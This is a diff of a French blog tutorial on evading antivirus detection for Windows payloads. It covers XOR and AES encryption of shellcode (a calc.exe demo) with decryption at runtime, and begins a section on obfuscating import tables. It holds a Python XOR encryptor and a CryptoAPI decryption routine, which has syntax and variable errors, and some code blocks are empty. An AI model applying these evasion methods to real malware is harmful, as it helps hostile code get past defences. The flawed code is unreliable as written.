@@ -10,7 +10,7 @@ Le petit souci, c'est que les fonctions importées apparaitront directement dans
 
 Afin d'éviter qu'une solution anti-virale détecte statiquement notre payload non obfusqué, nous pouvons au préalable le chiffrer, l'inclure dans notre programme, puis le déchiffrer lors de l'exécution de notre programme. J'utiliserai deux algorithmes basiques, XOR et AES, à des fins de démonstration.
 
-Pour commencer, remplacons les simples nullbytes de notre payload avec un magnifique shellcode faisant pop calc.exe, à des fins de démonstrations. Chiffré au préalable en dehors de ce programme, en utilisant la string "korielzeth"
+Pour commencer, remplacons les simples nullbytes de notre payload avec un magnifique shellcode faisant pop calc.exe, à des fins de démonstrations.
 
 ```assembly
 0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
@@ -36,6 +36,44 @@ Long et et illisible par tout être humain normalement constitué (mes félicita
 
 ### XOR
 
+La première étape consiste pour commencer à chiffrer ledit shellcode. Commencons par le XOR-er en dehors de ce programme, en utilisant ce petit programme en python (écrit par "Renzo", l'instructeur du cours Sektor7 mentionné dans l'introduction de cette série d'articles), qui se charge de chiffrer notre payload en utilisant la chaîne de caractères "korielzeth" :
+
+```python
+import sys
+
+KEY = "korielzeth"
+
+def xor(data, key):
+	l = len(key)
+	output_str = ""
+
+	for i in range(len(data)):
+		current = data[i]
+		current_key = key[i%len(key)]
+		output_str += chr(ord(current) ^ ord(current_key))
+	
+	return output_str
+
+def printC(ciphertext):
+	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
+
+try:
+    plaintext = open(sys.argv[1], "r").read()
+except:
+    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    sys.exit()
+
+ciphertext = xor(plaintext, KEY)
+
+printC(ciphertext)
+```
+
+Une fois notre shellcode original passé à la moulinette de ce programme, celui-ci ressemblera à :
+
+```assembly
+
+```
+
 La fonction visant à déchiffrer le payload une fois l'exécution commencée, plutôt simple, ressemblera à ça :
 
 
@@ -57,7 +95,72 @@ Où payloadlen et clélen correspondent à la longueur (via l'utilisation de siz
 
 ### AES
 
-La fonction visant à déchiffrer le payload une fois l'exécution commencée, plutôt simple, ressemble à ça. 
+Même logique que précédemment. On prend notre payload original, le chiffrons (ici avec l'algorithme AES) avant de créer une fonction se chargeant de le déchiffrer lors de l'exécution du programme.
+
+Voilà à quoi ressemble le programme se chargeant du chiffrement :
+
+```python
+```
+
+
+
+La fonction visant à déchiffrer le payload une fois l'exécution commencée, quand à elle, ressemble à ça. 
 
 >Si vous êtes curieux concernant l'utilisation des fonctions cryptographiques de l'API Windows, vous pouvez aller jeter un oeil au deuxième post concernant mon journal de dévelopement d'une PoC de ransomware
 
+```cpp
+int AESdecrypt(char* payload, int payloadlen, char* key, size_t keylen) {
+	
+	HCRYPTPROV hProv;
+	HCRYPTKEY hKey;
+	HCRYPTHASH hHash;
+
+	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFY_CONTEXT) {
+
+		return -1;
+
+	}
+	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+
+
+		return -1;
+
+	}
+
+	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
+
+		return -1;
+	}
+
+	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+
+		return -1;
+	}
+
+	if (!CryptDecrypt(hKey,0,0,0,payload,&payload_len)) {
+
+
+		return -1;
+	}
+
+	CryptReleaseContext(hProv, 0);
+	CryptDestroyHash(hHash);
+	CryptDestroyKey(hKey);
+
+	return 0;
+}
+
+}
+```
+
+Les noms des fonctions sont somme toutes explicites : une handle est crée vers un contexte cryptographique, puis un hash SHA256 est généré et une Clé (objet Windows) est dérivée en se basant sur ledit hash et la clé (une chaîne de caractère aléatoire générée lors de l'encryption de ce programme). Le payload est ensuite déchiffré en utilisant cette Clé, puis les différentes handles vers les objects créés par la fonction (contexte, hash,et Clé) sont ensuite supprimés.
+
+## L'obfuscation de nos appels de fonction
+
+Comme mentionné dans l'introduction de cet article, le premier indicateur de dangerosité d'un exécutable, analysé en premier par les divers solutions anti-virales, qu'elles soient inclues dans les systèmes d'exploitation, est la table des imports dudit exécutable.
+
+Prenons comme exemple l'exécutable généré dans la section précédente, et analysons sa table d'imports avec l'utilitaire PEBear :
+
+
+
+ Il existe un moyen somme toute basique
